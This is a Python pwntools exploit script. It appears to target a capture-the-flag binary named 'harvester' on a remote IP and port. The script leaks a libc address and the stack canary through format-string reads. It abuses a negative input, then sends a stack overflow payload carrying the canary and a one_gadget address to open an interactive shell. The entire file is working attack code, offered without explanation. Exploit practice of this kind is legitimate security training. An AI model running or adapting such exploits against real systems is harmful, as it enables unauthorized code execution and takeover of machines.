from pwn import *
# p=process("./harvester")
p=remote('139.59.176.252',32106)
#pid = gdb.attach(p,gdbscript="b * stare")


def leak(format_str, idx):
    p.sendlineafter("> ","1")
    p.sendlineafter("> ",str(format_str))
    p.recvline()
    # print p.recvline()
    a=p.recvline()
    if idx == 1:
        leak = int(a.split(" ")[3].strip()[0:14],16)
    else:
        leak = int(a.split(" ")[3].strip()[0:18],16)

    return leak
def prep():
    p.sendlineafter("> ","2")
    p.sendlineafter("> ","y")
    p.sendlineafter("> ","-11")
    p.sendlineafter("> ","3")
    


leak_libc = leak("%21$p",1)
libc_start_main=leak_libc -231
libc_base = libc_start_main - 0x000000000021b10
system = libc_base +0x04f550
bin_sh = libc_base +0x1b3e1a
one_gadget1 = libc_base+0x4f3d5
one_gadget2 = libc_base+0x4f432
one_gadget3 = libc_base+0x10a41c
canary = leak("%11$p",2)

print hex(canary)
print hex(libc_base)
pad = "\0" * 40

payload = pad 
payload += p64(canary)
payload += "AAAAAAAA"
payload += p64(one_gadget1)

prep()
p.sendlineafter("> ",payload)

p.interactive()